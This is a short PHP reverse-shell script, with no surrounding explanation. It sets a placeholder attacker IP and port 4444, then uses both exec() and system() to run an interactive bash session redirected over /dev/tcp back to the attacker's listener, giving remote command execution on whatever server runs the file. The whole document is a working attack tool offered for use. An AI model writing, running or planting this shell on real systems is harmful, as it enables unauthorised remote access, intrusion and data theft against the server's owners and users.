<?php
$ip = 'YOUR_IP_HERE';
$port = 4444; // or whatever port you're listening on

// Using exec()
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");

// Or using system()
system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
